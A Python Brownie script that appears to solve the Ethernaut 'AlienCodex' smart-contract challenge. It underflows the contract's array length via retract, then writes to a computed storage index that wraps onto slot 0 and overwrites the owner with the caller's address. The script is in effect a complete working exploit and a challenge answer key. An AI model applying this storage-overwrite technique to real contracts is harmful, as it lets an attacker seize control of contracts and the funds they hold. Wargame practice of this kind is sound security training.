from scripts.helpful_scripts import *
from brownie import Contract, AlienCodex
from web3 import Web3

account = getAccount()


alien = Contract.from_abi(
    "AlienCodex", "0xA4791f24E924df055e02f255402f44e26387d44E", AlienCodex.abi
)


def main():
    index = (2**256) - Web3.toInt(
        Web3.keccak(
            hexstr="0x0000000000000000000000000000000000000000000000000000000000000001"
        )
    )

    content = "0x000000000000000000000001182Af69fB08b4D08c42B68cc0d9f50b14bCbFd7a"

    tx = alien.make_contact({"from": account})
    tx.wait(1)
    tx2 = alien.retract({"from": account})
    tx2.wait(1)
    tx3 = alien.revise(index, content, {"from": account})
    tx3.wait(1)

    print(alien.owner())
